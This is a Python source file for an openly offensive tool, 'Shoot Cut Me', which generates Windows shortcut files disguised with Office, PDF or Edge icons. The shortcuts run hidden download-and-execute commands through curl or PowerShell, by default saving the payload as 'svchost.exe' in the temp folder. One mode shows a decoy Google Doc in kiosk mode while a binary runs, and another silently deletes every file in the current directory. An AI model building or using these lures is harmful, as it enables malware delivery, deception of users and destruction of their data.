import os
import color
from pathlib import Path
import argparse
import winshell
from win32com.client import Dispatch

def banner():
    print(color.red("Shoot") + color.blink(" ︻デ═一 ") + color.blue("CutMe"))
    print("[+] Author: @hassanalachek")
    print(color.blue("[~] Anything that can be used for good can be used for evil [~]"))
    exit()

def getArguments():
    parser = argparse.ArgumentParser(
        prog='Shoot Cut Me',
        description='shootCutMe is a tool to create LNK file',
        epilog='')
    
    parser.add_argument('-b', '--banner', action='store_true')

    parser.add_argument('-v', '--version', action='version', version='%(prog)s 0.1')

    
    parser.add_argument('-i', '--icon')
    
    cmdGroup = parser.add_mutually_exclusive_group()
    cmdGroup.add_argument('-d', '--download', action='append', nargs=3, metavar=('url', 'downloaded_output_file_name', 'ouput_download_path'))
    cmdGroup.add_argument('-ex', '--excutable', metavar=("executable_name"))
    cmdGroup.add_argument('-dl', '--downloadandLaunch', action='append', nargs=3, metavar=('url', 'downloaded_output_file_name', 'ouput_download_path'))
    cmdGroup.add_argument('-fp', '--fakepdf', action="append", nargs=2, metavar=("google_doc_url", "executable_name"))
    cmdGroup.add_argument('--delete', action='store_true')
    parser.add_argument('-n', '--name', metavar=("LNK_file_name"))

    return parser.parse_args()

def getDefaultIconPath(args):
    if args.icon == 'edge':
        return r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe"
    
    if args.icon == 'pdf':
        return r"%ProgramW6432%\Adobe\Acrobat DC\Acrobat\Acrobat.exe"
    
    if args.icon == 'word':
        return 	r"%ProgramW6432%\Microsoft Office\root\Office16\WINWORD.EXE"
    
    if args.icon == 'powerpoint':
        return r"%ProgramW6432%\Microsoft Office\root\Office16\POWERPNT.EXE"
    
    if args.icon == 'excel':
        return r"%ProgramW6432%\Microsoft Office\root\Office16\XLICONS.EXE"

def chooseCMD(args):
    if args.download:
        if len(args.download[0]) == 3:
            return downloadFile(args.download[0][0], args.download[0][1], args.download[0][2])
    if args.excutable:
        return launchExecutable(args.excutable)
    
    if args.fakepdf:
        if len(args.fakepdf[0]) == 2:
            return fakePdf(args.fakepdf[0][0], args.fakepdf[0][1])
    if args.downloadandLaunch:
        if len(args.downloadandLaunch[0]) == 3:
            return downloadAndLaunchTheBinary(args.downloadandLaunch[0][0], args.downloadandLaunch[0][1], args.downloadandLaunch[0][2])

    if args.delete:
        return deleteAllFiles()

def downloadFile(remoteAddress, outputName, outputLocation="%TMP%"):
    """
    %COMSPEC%: C:\Windows\System32\cmd.exe
    """
    downloadCmd = f"%COMSPEC% "
    downloadCmdArguments = f"/c \"start /B C:\Windows\System32\curl.exe {remoteAddress} --output {os.path.join(outputLocation, outputName)}\""
    return (downloadCmd, downloadCmdArguments)

def launchExecutable(pathToBinary):
    executeCmd = "%COMSPEC% "
    executeCmdArguments = f"/c start /B {Path(pathToBinary)}"
    return (executeCmd, executeCmdArguments)

def fakePdf(googleDocLink, pathToBinary):
    pdfLNK = f"%COMSPEC% "
    pdfLNKArguments = f"/c \"start /B C:\\\"Program Files (x86)\"\Microsoft\Edge\Application\msedge.exe --kiosk {googleDocLink} & start /B {pathToBinary}\""
    
    return (pdfLNK, pdfLNKArguments)

def downloadAndLaunchTheBinaryCMD(remoteAddress, outputName="svchost.exe", outputLocation="%TMP%"):
    """
    %COMSPEC%: C:\Windows\System32\cmd.exe
    Downloads a binary from the provided remote address and launches it after downloading.
    """
    # Path to save the binary in the provided location
    outputBinaryPath = os.path.join(outputLocation, outputName)

    # Command to download the file using curl
    downloadCmd = "%COMSPEC% "
    downloadCmdArguments = f"/c curl -o {outputBinaryPath} {remoteAddress} && start /B {outputBinaryPath}"

    return (downloadCmd, downloadCmdArguments)

def downloadAndLaunchTheBinary(remoteAddress, outputName="svchost.exe", outputLocation="%TMP%"):
    """
    Downloads a binary from the provided remote address using PowerShell's Invoke-WebRequest
    and launches it without displaying any output or command window.
    """
    # Path to save the binary in the provided location
    outputBinaryPath = os.path.join(outputLocation, outputName)

    # Get the actual value of %SystemRoot%
    system_root = os.environ.get('SystemRoot', r'C:\Windows')

    # Full path to powershell.exe
    powershell_path = os.path.join(system_root, "System32", "WindowsPowerShell", "v1.0", "powershell.exe")

    # PowerShell command to download the file and run it silently
    downloadCmd = powershell_path
    downloadCmdArguments = (
        f"-WindowStyle Hidden -Command \""
        f"Invoke-WebRequest -Uri '{remoteAddress}' -OutFile '{outputBinaryPath}'; "
        f"Start-Process -NoNewWindow -FilePath '{outputBinaryPath}'"
        f"\""
    )

    return (downloadCmd, downloadCmdArguments)


def deleteAllFiles():
    deleteCmd = "%COMSPEC% "
    deleteCmdArguments = f"/c del /q *"
    return (deleteCmd, deleteCmdArguments)
    
def createShortCutFile(shortCutName, targetCmd, targetArguments, targetIcon):
    # Path to save the LNK file in
    path = os.path.join(os.getcwd(), shortCutName + ".lnk")

    # The Short Cut Target
    target = targetCmd
    
    # Icon To Display
    icon = targetIcon

    arguments = targetArguments

    shell = Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(path)
    shortcut.Targetpath = target
    shortcut.Arguments = arguments
    shortcut.IconLocation = icon
    shortcut.save()

if __name__ == '__main__':
    args = getArguments()
    if args.banner:
        banner()
    iconPath = getDefaultIconPath(args)
    targetCmd, targetCmdArguments = chooseCMD(args)
    createShortCutFile(args.name, targetCmd, targetCmdArguments, iconPath)
